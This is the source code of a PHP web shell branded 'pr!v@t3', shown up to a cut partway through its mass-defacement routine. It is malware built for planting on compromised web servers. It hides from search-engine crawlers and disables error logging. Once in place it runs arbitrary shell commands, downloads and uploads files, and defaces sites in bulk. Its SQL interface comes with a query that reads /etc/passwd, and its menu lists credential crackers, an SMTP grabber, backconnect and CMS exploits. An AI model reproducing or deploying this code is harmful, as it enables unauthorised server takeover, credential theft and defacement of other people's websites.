<?php
$auth_pass = "39d5b4a1417ba23b28b5a87aae5aa9c0"; // default: pr!v@t3
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
 
if(isset($_GET['bom'])){
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
 
function login_shell() {
?>
<html>
<head>
<title>pr!v@t3</title>
<style type="text/css">
html {
    background: #000000;
    color: green;
}
header {
    color: green;
    margin: 10px auto;
}
input[type=password] {
    width: 250px;
    height: 25px;
    color: red;
    background: #000000;
    border: 1px solid #ffffff;
    padding: 5px;
    margin-left: 20px;
    text-align: center;
}
</style>
</head>
<form method="post">
<center><input type="password" name="pass"><center>
</form>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
 
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<html>
<head>
<title>pr!v@t3</title>
<meta name='name' content='pr!v@t3 shell'>
<meta name='author' content='FRU_403'>
<meta name='info' content='Shell Extreme Crew Recoded By FRU_403'>
<meta name='Thanks' content='Extreme Crew - IndoXploit - Mr.P-teo - BackBox Team - N45HT - iTeens - Defacer Tersakiti Team'>
<meta charset="UTF-8">
<style type='text/css'>
html {
    background: #000000;
    font-family: 'Ubuntu';
    font-size: 13px;
    width: 100%;
}
li {
    display: inline;
}
table, th, td {
    border-collapse:collapse;
    font-family: Tahoma, Geneva, sans-serif;
    background: transparent;
}
.table_home, .th_home, .td_home {
    border: 1px solid #00FFFF;
}
th {
    padding: 10px;
}
a {
    color: #00FFFF;
    text-decoration: none;
}
a:hover {
    color: #00FFFF;
    text-shadow: 0pt 1pt 0.1em rgb(255, 255, 255);
    text-decoration:none;
}
b {
    color: #00FFFF;
}
input[type=text], input[type=password],input[type=submit] {
    background: transparent;
    color: #00FFFF;
    border: 1px solid #00FFFF;
    margin: 5px auto;
    padding-left: 5px;
    font-family: 'Ubuntu';
    font-size: 13px;
}
textarea {
    border: 1px solid #00FFFF;
    width: 100%;
    height: 400px;
    padding-left: 5px;
    margin: 10px auto;
    resize: none;
    background: transparent;
    color: #00FFFF;
    font-family: 'Ubuntu';
    font-size: 13px;
}
select {
    width: 152px;
    background: #000000;
    color: lime;
    border: 1px solid #00FFFF;
    margin: 5px auto;
    padding-left: 5px;
    font-family: 'Ubuntu';
    font-size: 13px;
}
option:hover {
    background: lime;
    color: #000000;
}
*{
    text-shadow: 0pt 0pt 0.3em rgb(153, 153, 153);
    font-size:11px;
    font-family:Tahoma,Verdana,Arial;
    color:#00FFFF;
}
.mybox{-moz-border-radius: 10px; border-radius: 10px;border:1px solid #00FFFF; padding:4px 2px;width:70%;line-height:24px;background:none;box-shadow: 0px 4px 2px white;-webkit-box-shadow: 0px 4px 2px #00FFFF;-moz-box-shadow: 0px 4px 2px #00FFFF;}
.cgx2 {text-align: center;letter-spacing:1px;font-family: "orbitron";color: #00FFFF;font-size:25px;text-shadow: 5px 5px 5px black;}
.infoweb {
    border-right: 1px solid #00FFFF;
}
a:hover{
    text-decoration:none;
}
div #menu li:hover {cursor:pointer;
}
div#menu ul {
        margin:1px 1px 1px 1px;padding:0;float:left;
}
div#menu li {
            position:relative;display:block;float:left;
}
div#menu li:hover>ul {
    left:0px;
}
div#menu a{
    margin:1px 1px 1px 1px;padding:0;float:left;-moz-border-radius: 6px; border-radius: 12px; border:1px solid #00FFFF;display:block;float:left;padding:4px 6px;margin:0 6px 0 0;text-decoration:none;letter-spacing:3px;color:#00FFFF;
}
div#menu a:hover{
        text-shadow: 0pt 1pt 0.1em rgb(255, 255, 255);
        text-decoration:none;
}
div#menu ul ul {
        margin:2px 1px 1px 1px;float:left;position:absolute;top:20px;left:-990em;width:140px;padding:5px 0 5px 0;background:none;
}
div#menu ul ul a {
            margin-top:1px;padding:1px 1px 1px 1px;height:20px;float:none;display:block;color:#00FFFF;
}
.output {
    margin:auto;border:2px solid #00FFFF;width:100%;height:400px;background:none;padding:0 2px;
    }
.cmdbox {
    width:100%;
}
</style>
</head>
<?php
 
function w($dir,$perm) {
    if(!is_writable($dir)) {
        return "<font color=red>".$perm."</font>";
    } else {
        return "<font color=lime>".$perm."</font>";
    }
}
function r($dir,$perm) {
    if(!is_readable($dir)) {
        return "<font color=red>".$perm."</font>";
    } else {
        return "<font color=lime>".$perm."</font>";
    }
}
function exe($cmd) {
    if(function_exists('system')) {        
        @ob_start();       
        @system($cmd);     
        $buff = @ob_get_contents();        
        @ob_end_clean();       
        return $buff;  
    } elseif(function_exists('exec')) {        
        @exec($cmd,$results);      
        $buff = "";        
        foreach($results as $result) {         
            $buff .= $result;      
        } return $buff;    
    } elseif(function_exists('passthru')) {        
        @ob_start();       
        @passthru($cmd);       
        $buff = @ob_get_contents();        
        @ob_end_clean();       
        return $buff;  
    } elseif(function_exists('shell_exec')) {      
        $buff = @shell_exec($cmd);     
        return $buff;  
    }
}
function perms($file){
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
    } else {
    // Unknown
    $info = 'u';
    }
        // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
    (($perms & 0x0800) ? 's' : 'x' ) :
    (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
    (($perms & 0x0400) ? 's' : 'x' ) :
    (($perms & 0x0400) ? 'S' : '-'));
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
    (($perms & 0x0200) ? 't' : 'x' ) :
    (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
function hdd($s) {
    if($s >= 1073741824)
    return sprintf('%1.2f',$s / 1073741824 ).' GB';
    elseif($s >= 1048576)
    return sprintf('%1.2f',$s / 1048576 ) .' MB';
    elseif($s >= 1024)
    return sprintf('%1.2f',$s / 1024 ) .' KB';
    else
    return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function getsource($url) {
    $curl = curl_init($url);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($curl);
            curl_close($curl);
    return $content;
}
function bing($dork) {
    $npage = 1;
    $npages = 30000;
    $allLinks = array();
    $lll = array();
    while($npage <= $npages) {
        $x = getsource("http://www.bing.com/search?q=".$dork."&first=".$npage);
        if($x) {
            preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
            foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
            $npage = $npage + 10;
            if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
        } else break;
    }
    $URLs = array();
    foreach($allLinks as $url){
        $exp = explode("/", $url);
        $URLs[] = $exp[2];
    }
    $array = array_filter($URLs);
    $array = array_unique($array);
    $sss = count(array_unique($array));
    foreach($array as $domain) {
        echo $domain."\n";
    }
}
function reverse($url) {
    $ch = curl_init("http://domains.yougetsignal.com/domains.php");
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
          curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_POST, 1);
    $resp = curl_exec($ch);
    $resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
    $array = explode(",,", $resp);
    unset($array[0]);
    foreach($array as $lnk) {
        $lnk = "http://$lnk";
        $lnk = str_replace(",", "", $lnk);
        echo $lnk."\n";
        ob_flush();
        flush();
    }
        curl_close($ch);
}
if(get_magic_quotes_gpc()) {
    function ec_ss($array) {
        return is_array($array) ? array_map('ec_ss', $array) : stripslashes($array);
    }
    $_POST = ec_ss($_POST);
    $_COOKIE = ec_ss($_COOKIE);
}
 
if(isset($_GET['folder'])) {
    $dir = $_GET['folder'];
    chdir($dir);
} else {
    $dir = getcwd();
}
$kernel = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font style='color:lime'>ON</font>" : "<font style='color:red'>OFF</font>";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font style='color:lime'>ON</font>" : "<font style='color:red'>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font style='color:lime'>ON</font>" : "<font style='color:red'>OFF</font>";
$wget = (exe('wget --help')) ? "<font style='color:lime'>ON</font>" : "<font style='color:red'>OFF</font>";
$perl = (exe('perl --help')) ? "<font style='color:lime'>ON</font>" : "<font style='color:red'>OFF</font>";
$python = (exe('python --help')) ? "<font style='color:lime'>ON</font>" : "<font style='color:red'>OFF</font>";
$show_ds = (!empty($ds)) ? "<font style='color:red'>$ds</font>" : "<font style='color:lime'>ON</font>";
if(!function_exists('posix_getegid')) {
    $user = @get_current_user();
    $uid = @getmyuid();
    $gid = @getmygid();
    $group = "?";
} else {
    $uid = @posix_getpwuid(posix_geteuid());
    $gid = @posix_getgrgid(posix_getegid());
    $user = $uid['name'];
    $uid = $uid['uid'];
    $group = $gid['name'];
    $gid = $gid['gid'];
}
echo "<table>";
echo "<td class=infoweb>";
echo "System: <font color=lime>".$kernel."</font><br>";
echo "User: <font color=lime>".$user."</font> (".$uid.") Group: <font color=lime>".$group."</font> (".$gid.")<br>";
echo "HDD: <font color=lime>$used</font> / <font color=lime>$total</font> ( Free: <font color=lime>$freespace</font> )<br>";
echo "Safe Mode: $sm<br>";
echo "Disable Functions: $show_ds<br>";
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
echo "Current DIR: ";
foreach($scdir as $c_dir => $cdir) {   
    echo "<a href='?bom&folder=";
    for($i = 0; $i <= $c_dir; $i++) {
        echo $scdir[$i];
        if($i != $c_dir) {
        echo "/";
        }
    }
    echo "'>$cdir</a>/";
}
echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ]";
echo "</td><td style='width:15%'>";
echo "&nbsp;Server IP: <font color=lime>".$ip."</font><br>&nbsp;Your IP: <font color=lime>".$_SERVER['REMOTE_ADDR']."</font>";
echo "<br><br>";
echo "&nbsp;<a href='?bom' style='border:1px solid #00FFFF;width:80px;padding:0px 8px 0px 8px;'>H O M E</a>&nbsp;<a href='?bom&do=kill' style='border:1px solid #00FFFF;width:80px;padding:0px 8px 0px 8px;'>K I L L </a>&nbsp;<a href='?bom&logout=true' style='color:red;border:1px solid #00FFFF;width:80px;padding:0px 8px 0px 8px;'>L O G O U T</a>";
echo "</td></table>";
echo "<hr>";
echo "
<table>
<tr>
<div id='menu'>
    <ul class=menu>
        <li><a href='?bom&folder=$dir'>Filesman</a></li>
        <li><a href='?bom&folder=$dir&do=cmd'>Command</a></li>
        <li><a href='?bom&folder=$dir&do=jumping'>Jumper</a></li>
        <li><a>Symlink</a>
            <ul>
                <li><a href='?bom&folder=$dir&do=config' style='background-color:black'>&nbsp;Config</a></li>
                <li><a href='?bom&folder=$dir&do=convh' style='background-color:black'>&nbsp;Config vhosts</a></li>
                <li><a href='?bom&folder=$dir&do=symser' style='background-color:black'>&nbsp;Symlink Server</a></li>
            </ul>
        </li>
        <li><a>Mass</a>
        <ul>
		<li><a href='?bom&folder=$dir&do=mass_mail' style='background:black'>&nbsp;Mass Mailer</a></li>
        <li><a href='?bom&folder=$dir&do=mass_deface' style='background:black'>&nbsp;Mass Deface</a></li>
        <li><a href='?bom&folder=$dir&do=mass_helper' style='background:black'>&nbsp;Mass Helper</a></li>
		<li><a href='?bom&folder=$dir&do=mass_delete' style='background:black'>&nbsp;Mass Delete</a></li>
        </ul>
        </li>
        <li><a href='?bom&folder=$dir&do=domains'>Domains</a></li>
        <li><a href='?bom&folder=$dir&do=upload'>Uploader</a></li>
        <li><a>Tools</a>
            <ul>
				<li><a href='?bom&folder=$dir&do=fake_root' style='background-color:black'>&nbsp;Fake Root</a></li>
                <li><a href='?bom&folder=$dir&do=network' style='background-color:black'>&nbsp;Backconnect</a></li>
                <li><a href='?bom&folder=$dir&do=mysql' style='background-color:black'>&nbsp;Mysql Interface</a></li>
                <li><a href='?bom&folder=$dir&do=adminer' style='background-color:black'>&nbsp;Adminer</a></li>
				<li><a href='?bom&folder=$dir&do=cgi' style='background-color:black'>&nbsp;Cgi Telnet</a></li>
            </ul>
        </li>
        <li><a>Grab/Crack</a>
            <ul>
                <li><a href='?bom&folder=$dir&do=cpanel' style='background-color:black'>&nbsp;Cpanel Cracker</a></li>
                <li><a href='?bom&folder=$dir&do=smtp' style='background-color:black'>&nbsp;SMTP Grabber</a></li>
            </ul>
        </li>
        <li><a>Bypass</a>
        <ul>
        <li><a href='?bom&folder=$dir&do=etcpler' style='background-color:black'>&nbsp;etc/passw</a></li>
        <li><a href='?bom&folder=$dir&do=bypass' style='background-color:black'>&nbsp;Disable&nbsp;Functions</a></li>
                </ul>
        </li>
		<li><a>Auto Tools</a>
			<ul>
				<li><a href='?bom&folder=$dir&do=auto_edit_user' style='background-color:black'>&nbsp;Auto Edit User</a></li>
				<li><a href='?bom&folder=$dir&do=auto_wp' style='background-color:black'>&nbsp;Auto WordPress</a></li>
				<li><a href='?bom&folder=$dir&do=auto_dwp' style='background-color:black'>&nbsp;Auto Deface WP</a></li>
				<li><a href='?bom&folder=$dir&do=auto_dwp2' style='background-color:black'>&nbsp;Deface WP v.2</a></li>
			</ul>
		</li>
		<li><a href='?bom&folder=$dir&do=rdp'>Create RDP</a></li>
		<li><a href='?bom&folder=$dir&do=hash'>Hash</a></li>
        <li><a href='?bom&folder=$dir&do=boom'>Ngindex</a></li>
		<li><a>Exploit</a>
			<ul>
				<li><a href='?bom&folder=$dir&do=lokmed_login_shell' style='background-color:black'>&nbsp;Lokomedia</a></li>
				<li><a href='?bom&folder=$dir&do=sqli_scanner' style='background-color:black'>&nbsp;SQLI Scanner</a></li>
				<li><a href='?bom&folder=$dir&do=popoji_add_admin' style='background-color:black'>&nbsp;Popoji</a></li>
				<li><a href='?bom&folder=$dir&do=tevolution' style='background-color:black'>&nbsp;Tevolution</a></li>
				<li><a href='?bom&folder=$dir&do=u-design_exploit' style='background-color:black'>&nbsp;U-Design</a></li>
				<li><a href='?bom&folder=$dir&do=u-design_dorker' style='background-color:black'>&nbsp;U-Design Dorker</a></li>
			</ul>
		</li>
		<li><a href='?bom&folder=$dir&do=zoneh' style='background-color:black'>Zone-H</a></li>
		<li><a href='?bom&folder=$dir&do=tentang'>About</a></li>
    </ul>
  </div></tr><br><br>";
  echo "<hr>";
  echo "<table>";
if($_GET['logout'] == true) {
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
    echo "<script>window.location='?';</script>";
} elseif($_GET['do'] == 'upload') {
    echo "<center>";
    if($_POST['upload']) {
        if($_POST['tipe_upload'] == 'biasa') {
            if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
                $act = "<br><font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
            } else {
                $act = "<font color=red>failed to upload file</font>";
            }
        } else {
            $root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
            $web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
            if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
                if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
                    $act = "<br><font color=lime>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
                } else {
                    $act = "<font color=red>failed to upload file</font>";
                }
            } else {
                $act = "<font color=red>failed to upload file</font>";
            }
        }
    }
    echo "Upload File:
    <form method='post' enctype='multipart/form-data'>
    <input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ]
    <input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
    <input type='file' name='ix_file'>
    <input type='submit' value='upload' name='upload'>
    </form>";
    echo $act;
    echo "</center>";
} elseif($_GET['do'] == 'kill') {
    if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
            die('<center><br><center><h2>Shell removed</h2><br>Goodbye , Thanks for take my shell today</center></center>');
        else
            echo '<center>unlink failed!</center>';
} elseif($_GET['do'] == 'mysql'){if(isset($_GET['sqlhost']) && isset($_GET['sqluser']) && isset($_GET['sqlpass']) && isset($_GET['sqlport'])){$sqlhost = $_GET['sqlhost'];$sqluser = $_GET['sqluser'];$sqlpass = $_GET['sqlpass'];$sqlport = $_GET['sqlport'];if($con = @mysql_connect($sqlhost.":".$sqlport,$sqluser,$sqlpass)){$msg .= "<div style='width:99%;padding:4px 10px 0 10px;'>";$msg .= "<p>Connected to ".$sqluser."<span class='gaya'>@</span>".$sqlhost.":".$sqlport;$msg .= "&nbsp;&nbsp;<span class='gaya'>-&gt;</span>&nbsp;&nbsp;<a href='?bom&folder=".$dir."&amp;do=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;'>[ databases ]</a>";if(isset($_GET['db'])) $msg .= "&nbsp;&nbsp;<span class='gaya'>-&gt;</span>&nbsp;&nbsp;<a href='?bom&folder=".$dir."&amp;do=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$_GET['db']."'>".htmlspecialchars($_GET['db'])."</a>";if(isset($_GET['table'])) $msg .= "&nbsp;&nbsp;<span class='gaya'>-&gt;</span>&nbsp;&nbsp;<a href='?bom&folder=".$dir."&amp;do=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$_GET['db']."&amp;table=".$_GET['table']."'>".htmlspecialchars($_GET['table'])."</a>";$msg .= "</p><p>version : ".mysql_get_server_info($con)." proto ".mysql_get_proto_info($con)."</p>";$msg .= "</div>";echo $msg;if(isset($_GET['db']) && (!isset($_GET['table'])) && (!isset($_GET['sqlquery']))){$db = $_GET['db'];$query = "DROP TABLE IF EXISTS b374k_table;\nCREATE TABLE `b374k_table` ( `file` LONGBLOB NOT NULL );\nLOAD DATA INFILE '/etc/passwd'\nINTO TABLE b374k_table;SELECT * FROM b374k_table;\nDROP TABLE IF EXISTS b374k_table;";$msg = "<div style='width:99%;padding:0 10px;'><form action='?' method='get'><input type='hidden' name='y' value='".$dir."' /> <input type='hidden' name='x' value='mysql' /> <input type='hidden' name='sqlhost' value='".$sqlhost."' /> <input type='hidden' name='sqluser' value='".$sqluser."' /> <input type='hidden' name='sqlport' value='".$sqlport."' /> <input type='hidden' name='sqlpass' value='".$sqlpass."' /> <input type='hidden' name='db' value='".$db."' /> <p><textarea name='sqlquery' class='output' style='width:98%;height:80px;'>$query</textarea></p> <p><input class='inputzbut' style='width:80px;' name='submitquery' type='submit' value='Go !' /></p> </form></div> ";$tables = array();$msg .= "<table class='explore' style='width:99%;'><tr><th>available tables on ".$db."</th></tr>";$hasil = @mysql_list_tables($db,$con);
while(list($table) = @mysql_fetch_row($hasil)){@array_push($tables,$table);} @sort($tables);
foreach($tables as $table){$msg .= "<tr><td><a href='?bom&folder=".$dir."&amp;do=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$db."&amp;table=".$table."'>$table</a></td></tr>";} $msg .= "</table>";}
elseif(isset($_GET['table']) && (!isset($_GET['sqlquery']))){
$db = $_GET['db'];$table = $_GET['table'];$query = "SELECT * FROM ".$db.".".$table." LIMIT 0,100;";$msgq = "<div style='width:99%;padding:0 10px;'><form action='?' method='get'> <input type='hidden' name='y' value='".$dir."' /> <input type='hidden' name='x' value='mysql' /> <input type='hidden' name='sqlhost' value='".$sqlhost."' /> <input type='hidden' name='sqluser' value='".$sqluser."' /> <input type='hidden' name='sqlport' value='".$sqlport."' /> <input type='hidden' name='sqlpass' value='".$sqlpass."' /> <input type='hidden' name='db' value='".$db."' /> <input type='hidden' name='table' value='".$table."' /> <p><textarea name='sqlquery' class='output' style='width:98%;height:80px;'>".$query."</textarea></p> <p><input class='inputzbut' style='width:80px;' name='submitquery' type='submit' value='Go !' /></p> </form></div> ";$columns = array();$msg = "<table class='explore' style='width:99%;'>";$hasil = @mysql_query("SHOW FIELDS FROM ".$db.".".$table);while(list($column) = @mysql_fetch_row($hasil)){$msg .= "<th>$column</th>";$kolum = $column;}$msg .= "</tr>";$hasil = @mysql_query("SELECT count(*) FROM ".$db.".".$table);
list($total) = mysql_fetch_row($hasil);
if(isset($_GET['z'])) $page = (int) $_GET['z'];
else $page = 1;$pagenum = 100;$totpage = ceil($total / $pagenum);$start = (($page - 1) * $pagenum);$hasil = @mysql_query("SELECT * FROM ".$db.".".$table." LIMIT ".$start.",".$pagenum);
while($datas = @mysql_fetch_assoc($hasil)){$msg .= "<tr>";foreach($datas as $data){if(trim($data) == "")
$data = "&nbsp;";$msg .= "<td>$data</td>";}$msg .= "</tr>";} $msg .= "</table>";$head = "<div style='padding:10px 0 0 6px;'> <form action='?' method='get'> <input type='hidden' name='y' value='".$dir."' /> <input type='hidden' name='x' value='mysql' /> <input type='hidden' name='sqlhost' value='".$sqlhost."' /> <input type='hidden' name='sqluser' value='".$sqluser."' /> <input type='hidden' name='sqlport' value='".$sqlport."' /> <input type='hidden' name='sqlpass' value='".$sqlpass."' /> <input type='hidden' name='db' value='".$db."' /> <input type='hidden' name='table' value='".$table."' /> Page <select class='inputz' name='z' onchange='this.form.submit();'>";
for($i = 1;$i <= $totpage;$i++){$head .= "<option value='".$i."'>".$i."</option>";
if($i == $_GET['z']) $head .= "<option value='".$i."' selected='selected'>".$i."</option>";} $head .= "</select><noscript><input class='inputzbut' type='submit' value='Go !' /></noscript></form></div>";$msg = $msgq.$head.$msg;}
elseif(isset($_GET['submitquery']) && ($_GET['sqlquery'] != "")){$db = $_GET['db'];$query = magicboom($_GET['sqlquery']);
$msg = "<div style='width:99%;padding:0 10px;'><form action='?' method='get'> <input type='hidden' name='y' value='".$dir."' /> <input type='hidden' name='x' value='mysql' /> <input type='hidden' name='sqlhost' value='".$sqlhost."' /> <input type='hidden' name='sqluser' value='".$sqluser."' /> <input type='hidden' name='sqlport' value='".$sqlport."' /> <input type='hidden' name='sqlpass' value='".$sqlpass."' /> <input type='hidden' name='db' value='".$db."' /> <p><textarea name='sqlquery' class='output' style='width:98%;height:80px;'>".$query."</textarea></p> <p><input class='inputzbut' style='width:80px;' name='submitquery' type='submit' value='Go !' /></p> </form></div> ";@mysql_select_db($db);$querys = explode(";",$query);foreach($querys as $query){if(trim($query) != ""){$hasil = mysql_query($query);
if($hasil){$msg .= "<p style='padding:0;margin:20px 6px 0 6px;'>".$query.";&nbsp;&nbsp;&nbsp;<span class='gaya'>[</span> ok <span class='gaya'>]</span></p>";$msg .= "<table class='explore' style='width:99%;'><tr>";
for($i=0;$i<@mysql_num_fields($hasil);$i++) $msg .= "<th>".htmlspecialchars(@mysql_field_name($hasil,$i))."</th>";$msg .= "</tr>";for($i=0;$i<@mysql_num_rows($hasil);$i++) {$rows=@mysql_fetch_array($hasil);$msg .= "<tr>";for($j=0;$j<@mysql_num_fields($hasil);$j++) {
if($rows[$j] == "") $dataz = "&nbsp;";
else $dataz = $rows[$j];$msg .= "<td>".$dataz."</td>";} $msg .= "</tr>";} $msg .= "</table>";}
else $msg .= "<p style='padding:0;margin:20px 6px 0 6px;'>".$query.";&nbsp;&nbsp;&nbsp;<span class='gaya'>[</span> error <span class='gaya'>]</span></p>";} } }
else {$query = "SHOW PROCESSLIST;\nSHOW VARIABLES;\nSHOW STATUS;";$msg = "<div style='width:99%;padding:0 10px;'><form action='?' method='get'> <input type='hidden' name='y' value='".$dir."' /><input type='hidden' name='x' value='mysql' /><input type='hidden' name='sqlhost' value='".$sqlhost."' /><input type='hidden' name='sqluser' value='".$sqluser."' /><input type='hidden' name='sqlport' value='".$sqlport."' /><input type='hidden' name='sqlpass' value='".$sqlpass."' /><input type='hidden' name='db' value='".$db."' /><p><textarea name='sqlquery' class='output' style='width:98%;height:80px;'>".$query."</textarea></p><p><input class='inputzbut' style='width:80px;' name='submitquery' type='submit' value='Go !' /></p></form></div> ";$dbs = array();$msg .= "<table class='explore' style='width:99%;'><tr><th>available databases</th></tr>";$hasil = @mysql_list_dbs($con);
while(list($db) = @mysql_fetch_row($hasil)){@array_push($dbs,$db);} @sort($dbs);foreach($dbs as $db){
$msg .= "<tr><td><a href='?bom&folder=".$dir."&amp;do=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$db."'>$db</a></td></tr>";} $msg .= "</table>";}
@mysql_close($con);} else $msg = "<p style='text-align:center;'>can't connect</p>";echo $msg;} else{?>
<br><center><h2 class="cgx2">MySQL Connect</h2><form action="?" method="get"><input type="hidden" name="y" value="<?php echo $dir;?>" /> <input type="hidden" name="x" value="mysql" /><table class="tabnet" style="width:300px;" align="center"> <tr><th colspan="2">Connection Form</th></tr> <tr><td>&nbsp;&nbsp;Host</td><td><input style="width:220px;" class="inputz" type="text" name="sqlhost" value="localhost" /></td></tr> <tr><td>&nbsp;&nbsp;Username</td><td><input style="width:220px;" class="inputz" type="text" name="sqluser" value="root" /></td></tr> <tr><td>&nbsp;&nbsp;Password</td><td><input style="width:220px;" class="inputz" type="text" name="sqlpass" value="password" /></td></tr> <tr><td>&nbsp;&nbsp;Port</td><td><input style="width:80px;" class="inputz" type="text" name="sqlport" value="3306" />&nbsp;<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitsql" /></td></tr></table></form></center>
<?php }}
  elseif($_GET['do'] == 'cmd') {?>
<form action="?bom&act=<?php echo $dir;?>&amp;do=cmd" method="post"> <table class="cmdbox"> <tr><td colspan="2">
<textarea class="output" readonly>
<?php if(isset($_POST['submitcmd'])) {echo @exe($_POST['cmd']);} ?>
</textarea> <tr><td colspan="2"><?php echo "$user&nbsp;>";?><input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" style="width:60%;" value="" /><input class="inputzbut" type="submit" value="Do !" name="submitcmd" style="width:12%;" /></td></tr> </table></form>
<?php } elseif($_GET['do'] == 'mass_deface') {
    function sabun_massal($dir,$namafile,$isi_script) {
        if(is_writable($dir)) {
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if($dirb === '.') {
                    file_put_contents($lokasi, $isi_script);
                } elseif($dirb === '..') {
                    file_put_contents($lokasi, $isi_script);
                } else {
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            echo "[<font color=lime>DONE</font>] $lokasi<br>";
                            file_put_contents($lokasi, $isi_script);
                            $idx = sabun_massal($dirc,$namafile,$isi_script);
                        }
                    }
                }
            }
        }
    }
    function sabun_biasa($dir,$namafile,$isi_script) {
        if(is_writable($dir)) {
            $dira = scandir($dir);
